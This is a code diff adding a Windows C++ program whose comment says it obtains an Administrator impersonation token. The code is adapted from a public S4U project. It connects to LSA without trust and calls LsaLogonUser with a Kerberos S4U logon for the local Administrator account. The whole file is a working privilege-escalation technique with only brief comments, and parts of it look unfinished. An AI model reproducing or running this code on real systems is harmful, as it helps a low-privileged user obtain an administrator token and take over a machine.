@@ -1,0 +1,205 @@
+//获取Administrator  模拟标识令牌  
+//理论来自//https://www.youtube.com/watch?v=QRpfvmMbDMg
+//代码修改自https://github.com/aurel26/s-4-u-for-windows/blob/master/s4u.cpp
+
+
+#include <Windows.h>
+#include <Ntsecapi.h>
+#include <sddl.h>
+#include <stdio.h>
+#include <tchar.h>
+
+#pragma comment(lib, "secur32.lib")
+
+#define STATUS_SUCCESS           0
+#define EXTRA_SID_COUNT          2
+
+
+HANDLE g_hHeap;
+
+
+VOID
+InitLsaString(
+    _Out_ PLSA_STRING DestinationString,
+    _In_z_ LPSTR szSourceString
+)
+{
+    USHORT StringSize;
+
+    StringSize = (USHORT)strlen(szSourceString);
+
+    DestinationString->Length = StringSize;
+    DestinationString->MaximumLength = StringSize + sizeof(CHAR);
+    DestinationString->Buffer = (PCHAR)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, DestinationString->MaximumLength);
+
+    if (DestinationString->Buffer)
+    {
+        memcpy(DestinationString->Buffer, szSourceString, DestinationString->Length);
+    }
+    else
+    {
+        memset(DestinationString, 0, sizeof(LSA_STRING));
+    }
+}
+
+PBYTE
+InitUnicodeString(
+    _Out_ PUNICODE_STRING DestinationString,
+    _In_z_ LPWSTR szSourceString,
+    _In_ PBYTE pbDestinationBuffer
+)
+{
+    USHORT StringSize;
+
+    StringSize = (USHORT)wcslen(szSourceString) * sizeof(WCHAR);
+    memcpy(pbDestinationBuffer, szSourceString, StringSize);
+
+    DestinationString->Length = StringSize;
+    DestinationString->MaximumLength = StringSize + sizeof(WCHAR);
+    DestinationString->Buffer = (PWSTR)pbDestinationBuffer;
+
+    return (PBYTE)pbDestinationBuffer + StringSize + sizeof(WCHAR);
+}
+
+int
+_tmain(
+    _In_ int argc,
+    _In_ TCHAR* argv[]
+)
+{
+    BOOL bResult;
+    NTSTATUS Status;
+    NTSTATUS SubStatus;
+
+    HANDLE hLsa = NULL;
+    HANDLE hProcess = NULL;
+    HANDLE hToken = NULL;
+    HANDLE hTokenS4U = NULL;
+
+    OSVERSIONINFO osvi;
+    BOOL bIsLocal = TRUE;
+
+    LSA_STRING Msv1_0Name = { 0 };
+    LSA_STRING OriginName = { 0 };
+    PKERB_S4U_LOGON pS4uLogon ;
+    TOKEN_SOURCE TokenSource;
+    ULONG ulAuthenticationPackage;
+    DWORD dwMessageLength;
+
+    PBYTE pbPosition;
+
+    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFO si = { 0 };
+
+    PTOKEN_GROUPS pGroups = NULL;
+    PSID pLogonSid = NULL;
+    PSID pExtraSid = NULL;
+
+    PVOID pvProfile = NULL;
+    DWORD dwProfile = 0;
+    LUID logonId = { 0 };
+    QUOTA_LIMITS quotaLimits;
+
+    LPTSTR szCommandLine = NULL;
+    LPTSTR szDomain = NULL;
+    LPTSTR szUsername = NULL;
+    TCHAR seps[] = TEXT("\\");
+    TCHAR* next_token = NULL;
+
+    g_hHeap = GetProcessHeap();
+
+
+    szUsername = (LPTSTR)L"Administrator";
+
+ 
+    //
+    // Activate the TCB privilege
+    //
+    hProcess = GetCurrentProcess();
+    OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken);
+
+
+    TCHAR buf[MAX_COMPUTERNAME_LENGTH + 2];
+    DWORD buf_size;
+    buf_size = sizeof buf - 1;
+    GetComputerName(buf, &buf_size);
+    szDomain = buf;
+    //
+    // Connect (Untrusted) to LSA
+    //
+    Status = LsaConnectUntrusted(&hLsa);
+    if (Status != STATUS_SUCCESS)
+    {
+        fprintf(stderr, "LsaConnectUntrusted failed (error 0x%x).", Status);
+        hLsa = NULL;
+    }
+
+
+    InitLsaString(&Msv1_0Name, (LPSTR)"Negotiate");
+    Status = LsaLookupAuthenticationPackage(hLsa, &Msv1_0Name, &ulAuthenticationPackage);
+
+
+    dwMessageLength = (DWORD)sizeof(KERB_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(buf) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
+    pS4uLogon = (PKERB_S4U_LOGON)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, dwMessageLength);
+
+    pS4uLogon->MessageType = KerbS4ULogon;
+    pbPosition = (PBYTE)pS4uLogon + sizeof(KERB_S4U_LOGON);
+
+    pbPosition = InitUnicodeString(&pS4uLogon->ClientUpn, szUsername, pbPosition);
+    pbPosition = InitUnicodeString(&pS4uLogon->ClientRealm, buf, pbPosition);
+
+    //
+    // Misc
+    //
+    strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "NT.NET");
+    InitLsaString(&OriginName, (LPSTR)"S4U");
+    AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);
+
+    //
+    // Add extra SID to token.
+    //
+    // If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
+    //
+    pGroups = NULL;
+
+
+    //
+    // Call LSA LsaLogonUser
+    //
+    // This call required SeTcbPrivilege privilege:
+    //    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
+    //    - [2] to add supplemental SID with LocalGroups parameter.
+    //    - [3] to use a username with a domain name different from machine name (or '.').
+    //
+    Status = LsaLogonUser(
+        hLsa,
+        &OriginName,
+        Network,                // Or Batch
+        ulAuthenticationPackage,
+        pS4uLogon,
+        dwMessageLength,
+        pGroups,                // LocalGroups
+        &TokenSource,           // SourceContext
+        &pvProfile,
+        &dwProfile,
+        &logonId,
+        &hTokenS4U,
+        &quotaLimits,
+        &SubStatus
+    );
+
+    if (Status != STATUS_SUCCESS)
+    {
+        printf("LsaLogonUser failed (error 0x%x).\n", Status);
+ 
+    }
+    else
+    {
+        printf("token   %x\n", TokenSource);
+    }
+
+    getchar();
+   
+
+    return EXIT_SUCCESS;
+}
